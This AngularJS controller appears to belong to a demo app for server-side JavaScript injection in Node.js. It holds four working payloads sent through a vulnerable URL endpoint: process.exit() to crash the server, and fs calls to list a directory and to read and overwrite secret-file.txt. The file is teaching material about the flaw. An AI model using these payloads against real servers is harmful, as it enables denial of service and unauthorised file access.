'use strict';

angular.module('ssjidemoApp')
  .controller('MainCtrl', function ($scope, $http) {
    $scope.nodeAttacks = [];

    $scope.nodeAttacks.push({
      name: 'Denial of Service',
      info: 'Performs a Denial of Service attack on the Node.js Server by injecting a "process.exit()" command, ' +
        'exiting the server process and preventing the processing of any further requests.',
      attack: function () {
        window.location = '/api/node/process.exit()';
      }
    });

    $scope.nodeAttacks.push({
      name: 'File System Access - Directory Read',
      info: 'Performs a directory read on the file system of the Node.js Server by injecting a ' +
        '"res.end(require("fs").readdirSync(".").toString())" command, printing out all contents of the current ' +
        'directory and returning the result as the response to the current request.',
      attack: function () {
        window.location = '/api/node/res.end(require("fs").readdirSync(".").toString())';
      }
    });

    $scope.nodeAttacks.push({
      name: 'File System Access - File Read',
      info: 'Performs a file read on the file system of the Node.js Server by injecting a ' +
        '"res.end(require("fs").readFileSync("secret-file.txt"))" command, printing out contents of secret-file.txt ' +
        'and returning the result as the response to the current request.',
      attack: function () {
        window.location = '/api/node/res.end(require("fs").readFileSync("secret-file.txt"))';
      }
    });

    $scope.nodeAttacks.push({
      name: 'File System Access - File Write',
      info: 'Performs a file write on secret-file.txt on the Node.js Server by injecting a ' +
        '"res.end(require("fs").writeFileSync("secret-file.txt", "pwnd!!!" + ' +
        'require("fs").readFileSync("secret-file.txt")))" command, writing "pwnd!!!" in front of the contents of ' +
        'secret-file.txt. This can be verified using the previous file read attack.',
      attack: function () {
        window.location = '/api/node/res.end(require("fs").writeFileSync("secret-file.txt", ' +
          '"pwnd!!!" + require("fs").readFileSync("secret-file.txt")))';
      }
    });
  });